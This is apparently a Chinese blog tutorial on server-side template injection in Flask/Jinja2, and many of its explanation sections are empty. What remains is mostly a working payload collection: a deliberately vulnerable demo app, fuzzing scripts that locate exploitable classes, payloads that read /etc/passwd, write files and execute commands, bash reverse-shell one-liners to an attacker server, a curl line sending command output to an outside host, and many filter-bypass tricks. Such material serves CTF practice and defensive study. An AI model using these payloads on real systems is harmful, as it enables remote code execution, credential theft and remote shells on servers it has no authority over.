# 原创
：  详解SSTI模板注入

# 详解SSTI模板注入

#### 详解SSTI模板注入

## SSTI简介

> 



## 常见的模板引擎

### PHP

> 



> 



> 



### JAVA

> 



> 



> 



### PYTHON

> 



> 



> 



### RUBY

> 
ERB：全称是Embedded RuBy，意思是嵌入式的Ruby，是一种文本模板技术，和 JSP 的语法很像


### GOLANG

> 



## SSTI产生的原因

> 



## 常用检测工具 Tplmap

> 



## Flask/Jinja模板引擎的相关绕过

> 



### Flask简介

> 



### demo漏洞代码

```
from flask import Flask
from flask import render_template
from flask import request
from flask import render_template_string
app = Flask(__name__)
@app.route('/test',methods=['GET', 'POST'])
def test():
    template = '''
        &lt;div class="center-content error"&gt;
            &lt;h1&gt;Oops! That page doesn't exist.&lt;/h1&gt;
            &lt;h3&gt;%s&lt;/h3&gt;
        &lt;/div&gt; 
    ''' %(request.url)
    return render_template_string(template)

if __name__ == '__main__':
    app.run(host='127.0.0.1', debug=True)

```

### 基础知识

#### 沙盒逃逸

> 



#### Python的内建函数

> 



#### 名称空间

> 



> 
- 内建名称空间：Python 自带的名字，在 Python 解释器启动时产生，存放一些 Python 内置的名字- 全局名称空间：在执行文件时，存放文件级别定义的名字- 局部名称空间（可能不存在）：在执行文件的过程中，如果调用了函数，则会产生该函数的名称空间，用来存放该函数内定义的名字，该名字在函数调用时生效，调用结束后失效


> 



#### 类继承

> 



> 

- **base**：对象的一个基类，一般情况下是 object- **mro**：获取对象的基类，只是这时会显示出整个继承链的关系，是一个列表，object 在最底层所以在列表中的最后，通过 **mro**[-1] 可以获取到- **subclasses**()：继承此对象的子类，返回一个列表


> 



### 寻找Python-SSTI攻击载荷的过程

#### 攻击载荷过程

> 



```
对于返回的是定义的Class类的话:
__dict__          //返回类中的函数和属性，父类子类互不影响
__base__          //返回类的父类 python3
__mro__           //返回类继承的元组，(寻找父类) python3
__init__          //返回类的初始化方法   
__subclasses__()  //返回类中仍然可用的引用  python3
__globals__       //对包含函数全局变量的字典的引用 python3

对于返回的是类实例的话:
__class__         //返回实例的对象，可以使类实例指向Class，使用上面的魔术方法

```

```
''.__class__.__mro__[-1]
{}.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]

```

> 



```
config
request
url_for
get_flashed_messages
self
redirect

```

> 



```
object.__subclasses__()

```

> 



```
''.__class__.__mro__[2].__subclasses__()[99].__init__
&lt;slot wrapper '__init__' of 'object' objects&gt;

''.__class__.__mro__[2].__subclasses__()[59].__init__
&lt;unbound method WarningMessage.__init__&gt;

```

> 



```
''.__class__.__mro__[2].__subclasses__()[138].__init__.__globals__['__builtins__']

```

> 



```
''.__class__.__mro__[-1].__subclasses__()[138].__init__.__globals__['__builtins__']['file']('/etc/passwd').read()

```

#### 常用的目标函数

```
file
subprocess.Popen
os.popen
exec
eval

```

#### 常见的中间对象

```
catch_warnings.__init__.func_globals.linecache.os.popen('bash -i &gt;&amp; /dev/tcp/127.0.0.1/233 0&gt;&amp;1')
lipsum.__globals__.__builtins__.open("/flag").read()
linecache.os.system('ls')

```

#### fuzz可利用类脚本

> 



```
import requests

url = ""

index = 0
for i in range(100, 1000):
    #print i
    payload = "{{''.__class__.__mro__[-1].__subclasses__()[%d]}}" % (i)
    params = {
        "search": payload
    }
    #print(params)
    req = requests.get(url,params=params)
    #print(req.text)
    if "subprocess.Popen" in req.text:
        index = i
        break


print("index of subprocess.Popen:" + str(index))
print("payload:{{''.__class__.__mro__[2].__subclasses__()[%d]('ls',shell=True,stdout=-1).communicate()[0].strip()}}" % i)

```

#### 服务端fuzz

> 



```
{% for c in [].__class__.__base__.__subclasses__() %}
  {% if c.__name__=='catch_warnings' %}
  {{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('&lt;command&gt;').read()") }}
  {% endif %}
{% endfor %}

```

#### Python常用的命令执行方式

> 
- os.system()：该方法的参数就是 string 类型的命令，在 linux 上返回值为执行命令的 exit 值；而windows上返回值则是运行命令后 shell 的返回值；注意：该函数返回命令执行结果的返回值，并不是返回命令的执行输出（执行成功返回0，失败返回-1）


> 
- os.popen()：返回的是 file read 的对象，如果想获取执行命令的输出，则需要调用该对象的 read() 方法


### Python-Web框架配置文件

#### Tornado

> 



#### flaks

> 



```
{{url_for.__globals__['__builtins__'].__import__('os').system('ls')}}

如果过滤了{{config}}且框架是flask的话便可以使用如下payload进行代替

{{get_flashed_messages.__globals__['current_app'].config}}
{{url_for.__globals__['current_app'].config}}

```

### Flask过滤器

#### 定义

> 



#### 使用方式

```
变量|过滤器
variable|filter(args)    
variable|filter        //如果过滤器没有参数可以不加括号

```

#### 用的过滤器

```
int()：将值转换为int类型；

float()：将值转换为float类型；

lower()：将字符串转换为小写；

upper()：将字符串转换为大写；

title()：把值中的每个单词的首字母都转成大写；

capitalize()：把变量值的首字母转成大写，其余字母转小写；

trim()：截取字符串前面和后面的空白字符；

wordcount()：计算一个长字符串中单词的个数；

reverse()：字符串反转；

replace(value,old,new)： 替换将old替换为new的字符串；

truncate(value,length=255,killwords=False)：截取length长度的字符串；

striptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；

escape()或e：转义字符，会将&lt;、&gt;等符号转义成HTML中的符号，显例：content|escape或content|e；

safe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义，示例： {{'&lt;em&gt;hello&lt;/em&gt;'|safe}}；

list()：将变量列成列表；

string()：将变量转换成字符串；

join()：将一个序列中的参数值拼接成字符串；

abs()：返回一个数值的绝对值；

first()：返回一个序列的第一个元素；

last()：返回一个序列的最后一个元素；

format(value,arags,*kwargs)：格式化字符串，比如：{{ "%s" - "%s"|format('Hello?',"Foo!") }}将输出：Helloo? - Foo!

length()：返回一个序列或者字典的长度；

sum()：返回列表内数值的和；

sort()：返回排序后的列表；

default(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替，示例：name|default('xiaotuo')----如果name不存在，则会使用xiaotuo来替代，boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true，也可以使用or来替换

```

### 模块查找脚本

> 



```
num = 0
for item in ''.__class__.__mro__[-1].__subclasses__():
    try:
        if 'os' in item.__init__.__globals__:
            print num,item
        num+=1
    except:
        num+=1

```

> 



```
#!/usr/bin/python3
# coding=utf-8
# python 3.5
#jinja2模板
from flask import Flask
from jinja2 import Template
# Some of special names
searchList = ['__init__', "__new__", '__del__', '__repr__', '__str__', '__bytes__', '__format__', '__lt__', '__le__', '__eq__', '__ne__', '__gt__', '__ge__', '__hash__', '__bool__', '__getattr__', '__getattribute__', '__setattr__', '__dir__', '__delattr__', '__get__', '__set__', '__delete__', '__call__', "__instancecheck__", '__subclasscheck__', '__len__', '__length_hint__', '__missing__','__getitem__', '__setitem__', '__iter__','__delitem__', '__reversed__', '__contains__', '__add__', '__sub__','__mul__']
neededFunction = ['eval', 'open', 'exec']
pay = int(input("Payload?[1|0]"))
for index, i in enumerate({}.__class__.__base__.__subclasses__()):
    for attr in searchList:
        if hasattr(i, attr):
            if eval('str(i.'+attr+')[1:9]') == 'function':
                for goal in neededFunction:
                    if (eval('"'+goal+'" in i.'+attr+'.__globals__["__builtins__"].keys()')):
                        if pay != 1:
                            print(i.__name__,":", attr, goal)
                        else:
                            print("{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='" + i.__name__ + "' %}{{ c." + attr + ".__globals__['__builtins__']." + goal + "(\"[evil]\") }}{% endif %}{% endfor %}")

```

### 常见Payload

> 



```
#python2有file
#读取密码
''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()
#写文件
''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evil.txt', 'w').write('evil code')
#OS模块
system
''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].system('ls')
popen
''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()
#eval
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")
#__import__
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()
#反弹shell
''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('bash -i &gt;&amp; /dev/tcp/你的服务器地址/端口 0&gt;&amp;1').read()
().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__('func_global'+'s')['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('bash -c "bash -i &gt;&amp; /dev/tcp/xxxx/9999 0&gt;&amp;1"')
注意该Payload不能直接放在 URL 中执行 , 因为 &amp; 的存在会导致 URL 解析出现错误，可以使用burp等工具
#request.environ
与服务器环境相关的对象字典

```

> 



```
#python3没有file，用的是open
#文件读取
{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}}
{{().__class__.__base__.__subclasses__[177].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("dir").read()')}}
#命令执行
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}{% endif %}{% endfor %}
[].__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].__dict__.values()[12].system('ls')

```

> 



### 常见可利用类

> 



```
''.__class__.__mro__[2].__subclasses__().index(file)

```

> 



```
''.__class__.__mro__[2].__subclasses__()[40]('&lt;File_To_Read&gt;').read()

```

> 



```
''.__class__.__mro__[2].__subclasses__()[91].get_data(0,"&lt;file_To_Read&gt;")

```

> 



```
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('/etc/passwd').read()    #将read() 修改为 write() 即为写文件

```

> 



```
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("whoami").read()')

```

> 



```
查看 warnings.catch_warnings 方法的位置
[].__class__.__base__.__subclasses__().index(warnings.catch_warnings)

查看 linecatch 的位置
[].__class__.__base__.__subclasses__()[59].__init__.__globals__.keys().index('linecache')

查找os模块的位置
[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.keys().index('os')

查找system方法的位置(在这里使用os.open().read()可以实现一样的效果,步骤一样,不再复述)
[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.keys().index('system')

调用system方法
[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.values()[144]('whoami')

```

> 



```
{}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('commands').getstatusoutput('ls')

{}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('ls')

{}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('id').read()

```

### 遇到SSTI题目时的思路

> 



### 花式绕过

#### 绕过中括号

> 



```
__mro__[2]== __mro__.__getitem__(2)
''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()

```

#### 绕过引号

> 



```
{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()}}&amp;path=/etc/passwd

```

#### 绕过双下划线

> 



```
{{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__

```

#### 拼接绕过

```
object.__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')
().__class__.__bases__[0].__subclasses__()[40]('r','fla'+'g.txt')).read()

```

#### 编码绕过

```
().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['ZXZhbA=='.decode('base64')]("X19pbXBvcnRfXygnb3MnKS5wb3BlbignbHMnKS5yZWFkKCk=".decode('base64'))(
等价于
().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['eval']("__import__('os').popen('ls').read()")

```

#### 绕过{{或}}

> 



```
{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://xx.xxx.xx.xx:8080/?i=`whoami`').read()=='p' %}1{% endif %}

```

#### 绕过.

> 



```
{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(177)|attr('__init__')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__("os").popen("dir").read()')}}

{{ config['__class__']['__init__']['__globals__']['os']['popen']('dir')['read']() }}

```

#### 过滤圆括号

> 



#### 绕过_和引号

> 



```
{{()|attr(request.values.a)}}&amp;a=class

```

> 



```
{{''[request.args.t1]}}&amp;t1=__class__
#若request.args改为request.values则利用post的方式进行传参

{{''[request['args']['t1']]}}&amp;t1=__class__
#若使用POST，args换成form即可

```

#### 关键词过滤

> 



```
{{[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40]("/etc/passwd").read()}}

```

> 



```
{{[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40]("/etc/passwd").read()}}

```

> 



```
{% set a=dict(o=x,s=xx)|join %}

```

> 



```
{% set quote = ((app.__doc__|list()).pop(337)|string())%}
类似的还有
{% set sp = ((app.__doc__|list()).pop(102)|string)%}
{% set pt = ((app.__doc__|list()).pop(320)|string)%}
{% set lb = ((app.__doc__|list()).pop(264)|string)%}
{% set rb = ((app.__doc__|list()).pop(286)|string)%}
{% set slas = (eki.__init__.__globals__.__repr__()|list()).pop(349)%}
{% set xhx = (({ }|select()|string()|list()).pop(24)|string())%}

```

> 



```
{% set xhx = (({ }|select()|string|list()).pop(24)|string)%}
{% set sp = ((app.__doc__|list()).pop(102)|string)%}
{% set pt = ((app.__doc__|list()).pop(320)|string)%}
{% set quote = ((app.__doc__|list()).pop(337)|string)%}
{% set lb = ((app.__doc__|list()).pop(264)|string)%}
{% set rb = ((app.__doc__|list()).pop(286)|string)%}
{% set slas = (eki.__init__.__globals__.__repr__()|list()).pop(349)%}
{% set bu = dict(buil=x,tins=xx)|join %}
{% set im = dict(imp=x,ort=xx)|join %}
{% set sy = dict(po=x,pen=xx)|join %}
{% set oms = dict(o=x,s=xx)|join %}
{% set fl4g = dict(f=x,lag=xx)|join %}
{% set ca = dict(ca=x,t=xx)|join %}
{% set ev = dict(ev=x,al=xx)|join %}
{% set red = dict(re=x,ad=xx)|join%}
{% set bul = xhx*2~bu~xhx*2 %}
{% set payload = xhx*2~im~xhx*2~lb~quote~oms~quote~rb~pt~sy~lb~quote~ca~sp~slas~fl4g~quote~rb~pt~red~lb~rb %}

```

> 



> 



```
{{""['{0:c}'['format'](95)+'{0:c}'['format'](95)+'{0:c}'['format'](99)+'{0:c}'['format'](108)+'{0:c}'['format'](97)+'{0:c}'['format'](115)+'{0:c}'['format'](115)+'{0:c}'['format'](95)+'{0:c}'['format'](95)]}}

```

> 



```
{%print (request.args.getlist(request.args.l)|join)%}&amp;l=a&amp;a=_&amp;a=_&amp;a=class&amp;a=_&amp;a=_

```

#### 对象层面禁用

> 



```
{{% set config=None%}} -&gt; {{url_for.__globals__.current_app.config}}

```

> 



```
del __builtins__.__dict__['__import__']

```

> 



```
reload(__builtins__)

```

#### 过滤config、request以及class

> 



#### 过滤config、request、class、**init**、file、**dict**、**builtines**、**import**、getattr以及os

> 



```
__init__ (allocation of the class)
__enter__ (enter context)
__exit__ (leaving context)

{{ session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]['__subcla'+'sses__']()[256].__enter__.__globals__['po'+'pen']('cat /etc/passwd').read() }}

```

### trick

#### Python字符的几种表示方式

```
16进制 \x41

8进制 \101

unicode \u0074

base64 'X19jbGFzc19f'.decode('base64') python3

join "fla".join("/g")

slice "glaf"[::-1]

lower/upper ["__CLASS__"|lower

format "%c%c%c%c%c%c%c%c%c"|format(95,95,99,108,97,115,115,95,95)

replace "__claee__"|replace("ee","ss")

reverse "__ssalc__"|reverse

```

#### Python字典或列表获取键值或下标的几种方式

```
dict['__builtins__']

dict.__getitem__('__builtins__')

dict.pop('__builtins__')

dict.get('__builtins__')

dict.setdefault('__builtins__')

list[0]

list.__getitem__(0)

list.pop(0)

```

#### SSTI获取对象元素的几种方式

```
class.attr

class.__getattribute__('attr')

class['attr']

class|attr('attr')

"".__class__.__mro__.__getitem__(2)

['__builtins__'].__getitem__('eval')

class.pop(40)

```

#### request旁路注入

```
request.args.name    #GET name

request.cookies.name #COOKIE name

request.headers.name #HEADER name

request.values.name  #POST or GET Name

request.form.name    #POST NAME

request.json         #Content-Type json

```

#### 通过拿到current_app这个对象获取当前flask App的上下文信息来实现config读取

```
{{url_for.__globals__.current_app.config}}

{{url_for.__globals__['current_app'].config}}

{{get_flashed_messages.__globals__['current_app'].config.}}

{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].cofig}}

```

#### 特殊变量

> 



```
{{url_for.__globals__['current_app'].config.FLAG}}

{{get_flashed_messages.__globals__['current_app'].config.FLAG}}

{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']}}

```
